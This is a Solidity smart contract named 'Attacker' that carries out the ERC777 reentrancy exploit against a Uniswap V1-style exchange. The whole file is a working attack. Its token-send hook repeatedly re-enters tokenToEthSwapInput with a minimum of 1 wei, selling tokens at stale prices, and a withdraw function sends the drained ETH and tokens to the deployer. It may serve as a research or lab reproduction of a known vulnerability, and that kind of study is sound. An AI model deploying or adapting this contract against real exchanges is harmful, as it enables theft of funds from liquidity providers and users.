// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC777/ERC777.sol";


interface UniswapExchange {
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}

contract Attacker is IERC777Sender {

    UniswapExchange public _victimExchange;
    ERC777 public _token;

    // Counter to keep track of the number of reentrant calls
    uint256 public _called = 0;

    uint256 public _tokensToSell;
    uint256 public _numberOfSales;

    address payable public _attacker;

    IERC1820Registry public _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    constructor(address exchangeAddress, address tokenAddress) public {
        _victimExchange = UniswapExchange(exchangeAddress);
        _token = ERC777(tokenAddress);
        _attacker = payable(msg.sender);


        // Register interface in ERC1820 registry
        _erc1820.setInterfaceImplementer(address(this), keccak256("ERC777TokensSender"), address(this));
    }

    // ERC777 hook
    function tokensToSend(address, address, address, uint256, bytes calldata, bytes calldata) external override{
        require(msg.sender == address(_token), "Hook can only be called by the token");
        _called += 1;
        if(_called < _numberOfSales) {
            _callExchange();
        }
    }

    // Similar to callExchange, but able to receive parameters for more complex analysis
    function callExchange(uint256 amountOfTokensToSell, uint256 numberOfSales) public {


        _tokensToSell = amountOfTokensToSell;
        _numberOfSales = numberOfSales;
        _callExchange();
    }
    
    // Approve enough tokens to the exchange
    function _approve(address spender,uint amount) external{
        _token.approve(spender, amount);
    }

    // Attacker will call this function to withdraw the ETH after the attack
    function withdraw(address to) public {
        _attacker.transfer(address(this).balance); 

        uint amount = _token.balanceOf(address(this));
        _token.transfer(to, amount);
    }

    function _callExchange() private {
        _victimExchange.tokenToEthSwapInput(
            _tokensToSell,
            1 , // min_eth
            block.timestamp * 2 // deadline
        );
    }

    // Include fallback so we can receive ETH from exchange
   receive() external payable {}
}
